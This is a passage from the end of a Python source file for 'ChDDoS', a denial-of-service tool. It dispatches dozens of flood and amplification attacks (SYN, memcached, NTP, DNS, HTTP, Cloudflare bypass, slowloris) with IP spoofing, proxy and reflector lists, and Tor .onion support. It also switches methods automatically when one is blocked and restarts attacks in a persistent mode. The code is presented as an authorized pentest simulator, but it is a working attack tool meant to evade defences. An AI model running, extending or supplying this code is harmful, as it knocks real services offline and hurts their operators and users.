        elif method == 'char': char_flood(t, d, sp, ref)
        elif method == 'cldap': cldap_flood(t, d, sp, ref)
        elif method == 'ard': ard_flood(t, d, sp, ref)
        elif method == 'rdp': rdp_flood(t, d, sp, ref)
        elif method == 'snmp': snmp_flood(t, d, sp, ref)
        elif method == 'ssdp': ssdp_flood(t, d, sp, ref)
        elif method == 'dns': dns_amp(t, d, sp, ref)
        elif method == 'http': http_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'post': post_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'ovh': ovh_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'rhex': rhex_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'stomp': stomp_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'stress': stress_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'dyn': dyn_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'downloader': downloader_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'head': head_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'null': null_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'cookie': cookie_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'pps': pps_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'even': even_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'gsb': gsb_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'dgb': dgb_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'avb': avb_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'bot': bot_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'apache': apache_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'xmlrpc': xmlrpc_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'cfbuam': cfbuam_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'bypass': bypass_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'bomb': bomb_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'killer': killer_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)
        elif method == 'slowloris': slowloris(t, p, d, th)
        elif method == 'cfb': cfb_flood(f"http://{t}:{p}", d, prox, th, is_onion, rpc)

    target_url = f"http://{target}:{port}"
    blocked_methods = []
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=len(selected_methods)) as executor:
        for method in selected_methods:
            print(f"Starting {method} attack with {threads} threads, spoofing={'enabled' if spoof else 'disabled'}")
            executor.submit(run_attack, method, target, port, 30, proxies, threads, spoof, reflectors)
        
        while time.time() < start_time + duration:
            available = [m for m in selected_methods if m not in blocked_methods]
            if not available:
                print("All methods blocked, stopping attack.")
                break
            if not multi_methods:
                current_method = random.choice(available)
                print(f"Switching to {current_method} attack with {threads} threads, spoofing={'enabled' if spoof else 'disabled'}")
                executor.submit(run_attack, current_method, target, port, 30, proxies, threads, spoof, reflectors)
            
            if any(m in ['http', 'post', 'ovh', 'rhex', 'stomp', 'stress', 'dyn', 'downloader', 'head', 'null', 'cookie', 'pps', 'even', 'gsb', 'dgb', 'avb', 'bot', 'apache', 'xmlrpc', 'cfbuam', 'bypass', 'bomb', 'killer', 'cfb'] for m in selected_methods):
                status, latency = monitor_response(target_url, proxies, is_onion)
                if status in [403, 429] or (latency and latency < 100):
                    print(f"Method {selected_methods[-1]} likely blocked (status: {status}, latency: {latency}ms), switching...")
                    blocked_methods.append(selected_methods[-1])
                    if not multi_methods:
                        selected_methods = [random.choice(available)]
            
            print(f"PPS: {REQUESTS_SENT}, BPS: {BYTES_SENT}")
            REQUESTS_SENT = 0
            BYTES_SENT = 0
            time.sleep(1)

# Main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="ChDDoS Simulator Tool - For authorized penetration testing only, requires target permission.",
        epilog="""
Example Commands:
1. Basic HTTP Flood Attack:
   sudo python3 chddos.py -t testphp.vulnweb.com -p 80 -m http --threads 1000
2. Bomb Attack with Proxies:
   sudo python3 chddos.py -t testphp.vulnweb.com -p 80 -m bomb --threads 1000 --proxies proxy.txt
3. Auto Mode with Nmap Scan for Attack Selection:
   sudo python3 chddos.py -t testphp.vulnweb.com -p 80 -m auto --threads 1000 --proxies proxy.txt
4. Multi-Method Simultaneous Attack:
   sudo python3 chddos.py -t testphp.vulnweb.com -p 80 -m auto --threads 1000 --multi http,syn,bomb --spoof
5. Persistent Attack Mode:
   sudo python3 chddos.py -t testphp.vulnweb.com -p 80 -m auto --threads 1000 --persist 20 --proxies proxy.txt
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    basic_group = parser.add_argument_group('Basic Commands', 'Essential parameters for configuring the attack')
    attack_group = parser.add_argument_group('Attack Commands', 'Options for controlling attack methods and behavior')
    aggressive_group = parser.add_argument_group('Aggressive Commands', 'High-impact options for simulating severe attacks (use with caution)')
    
    basic_group.add_argument('-t', '--target', required=True, help='Target IP/URL (e.g., example.com or xxx.onion)')
    basic_group.add_argument('-p', '--port', type=int, default=80, help='Target port (1-65535)')
    basic_group.add_argument('-d', '--duration', type=int, default=60, help='Attack duration (seconds)')
    
    attack_group.add_argument('-m', '--method', choices=[
        'syn', 'udp', 'icmp', 'tcp', 'connection', 'vse', 'ts3', 'fivem', 'mcbot', 'minecraft', 'mcpe', 'quic',
        'mem', 'ntp', 'char', 'cldap', 'ard', 'rdp', 'snmp', 'ssdp', 'http', 'post', 'ovh', 'rhex', 'stomp',
        'stress', 'dyn', 'downloader', 'head', 'null', 'cookie', 'pps', 'even', 'gsb', 'dgb', 'avb', 'bot',
        'apache', 'xmlrpc', 'cfbuam', 'bypass', 'bomb', 'killer', 'slowloris', 'dns', 'cfb', 'auto'
    ], default='http', help='Attack method')
    attack_group.add_argument('--proxies', help='Proxy list file (format: ip:port)')
    attack_group.add_argument('--proxy-url', help='Proxy list URL')
    attack_group.add_argument('--reflectors', help='Reflectors list file (format: ip:port)')
    attack_group.add_argument('--threads', type=int, default=100, help='Number of threads for HTTP-based methods')
    attack_group.add_argument('--rpc', type=int, default=100, help='Requests per connection for HTTP-based methods')
    attack_group.add_argument('-s', '--spoof', action='store_true', help='Enable IP spoofing for scapy-based methods')
    attack_group.add_argument('--multi', help='Comma-separated list of methods for simultaneous attack (e.g., mem,syn,killer)')
    
    aggressive_group.add_argument('--persist', type=int, help='Persistent attack restart interval (minutes)')

    args = parser.parse_args()

    if args.threads < 1:
        sys.exit("Error: --threads must be a positive integer.")
    if args.persist is not None and args.persist < 1:
        sys.exit("Error: --persist must be a positive integer (minutes).")
    if not (1 <= args.port <= 65535):
        sys.exit("Error: --port must be between 1 and 65535.")
    if '.onion' in args.target and args.method not in ['http', 'post', 'ovh', 'rhex', 'stomp', 'stress', 'dyn', 'downloader', 'head', 'null', 'cookie', 'pps', 'even', 'gsb', 'dgb', 'avb', 'bot', 'apache', 'xmlrpc', 'cfbuam', 'bypass', 'bomb', 'killer', 'cfb', 'auto']:
        sys.exit("Error: .onion targets only support HTTP-based methods.")
    if '.onion' in args.target and not check_tor_service():
        sys.exit("Error: .onion target requires Tor service. Start with 'sudo service tor start'.")

    target = args.target
    proxies = load_valid_proxies(args.proxies, args.proxy_url, args.threads)
    reflectors = load_reflectors(args.reflectors)
    threads = args.threads
    spoof = args.spoof
    multi_methods = args.multi.split(',') if args.multi else None
    is_onion = '.onion' in target
    rpc = args.rpc

    def run_single_attack():
        print(f"Starting {args.method} attack on {target}:{args.port} for {args.duration}s with ChDDoS, {threads} threads, spoofing={'enabled' if spoof else 'disabled'}")
        if args.method == 'auto':
            auto_attack(target, args.port, args.duration, proxies, threads, spoof, reflectors, multi_methods, rpc)
        else:
            method_map = {
                'syn': syn_flood, 'udp': udp_flood, 'icmp': icmp_flood, 'tcp': tcp_flood, 'connection': connection_flood,
                'vse': vse_flood, 'ts3': ts3_flood, 'fivem': fivem_flood, 'mcbot': mcbot_flood, 'minecraft': minecraft_flood,
                'mcpe': mcpe_flood, 'quic': quic_flood, 'mem': mem_flood, 'ntp': ntp_flood, 'char': char_flood,
                'cldap': cldap_flood, 'ard': ard_flood, 'rdp': rdp_flood, 'snmp': snmp_flood, 'ssdp': ssdp_flood,
                'dns': dns_amp, 'slowloris': slowloris
            }
            http_methods = ['http', 'post', 'ovh', 'rhex', 'stomp', 'stress', 'dyn', 'downloader', 'head', 'null',
                            'cookie', 'pps', 'even', 'gsb', 'dgb', 'avb', 'bot', 'apache', 'xmlrpc', 'cfbuam',
                            'bypass', 'bomb', 'killer', 'cfb']
            if args.method in method_map:
                method_map[args.method](target, args.port, args.duration, spoof)
            elif args.method in http_methods:
                globals()[f"{args.method}_flood"](f"http://{target}:{args.port}", args.duration, proxies, threads, is_onion, rpc)

    if args.persist:
        print(f"Persist mode enabled, restarting every {args.persist} minutes. Press Ctrl+C to stop.")
        while True:
            try:
                run_single_attack()
                time.sleep(args.persist * 60)
            except KeyboardInterrupt:
                print("Persist mode stopped by user.")
                break
    else:
        run_single_attack()

    time.sleep(args.duration)
    print("ChDDoS attack simulation ended.")
